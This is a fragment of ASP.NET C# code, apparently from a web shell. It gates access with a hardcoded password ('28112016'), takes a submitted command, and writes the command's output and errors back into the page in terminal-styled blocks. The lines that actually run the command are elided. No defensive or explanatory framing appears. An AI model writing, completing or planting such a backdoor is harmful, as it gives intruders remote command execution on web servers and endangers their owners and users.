        ...
        if (Request["password"] != null && Request["password"] == "28112016")
        {
            ...
            if (!string.IsNullOrEmpty(lastCommand))
            {
                try
                {
                    ...
                    Response.Write("<pre style='background-color: #1e1e1e; color: #00ff00; padding: 15px; font-family: Consolas, monospace; border: 1px solid #444; border-radius: 5px; margin-bottom: 20px; overflow-x: auto;'>" + output + "</pre>");
                    if (!string.IsNullOrEmpty(error))
                    {
                        Response.Write("<pre style='background-color: #1e1e1e; color: #ff4c4c; padding: 15px; font-family: Consolas, monospace; border: 1px solid #444; border-radius: 5px; margin-bottom: 20px; overflow-x: auto;'>" + error + "</pre>");
                    }
                ...
                {
                    Response.Write("<pre style='color:red; background-color: #1e1e1e; padding: 15px; font-family: Consolas, monospace; border: 1px solid #444; border-radius: 5px;'>Error: " + ex.Message + "</pre>");
                }
            }
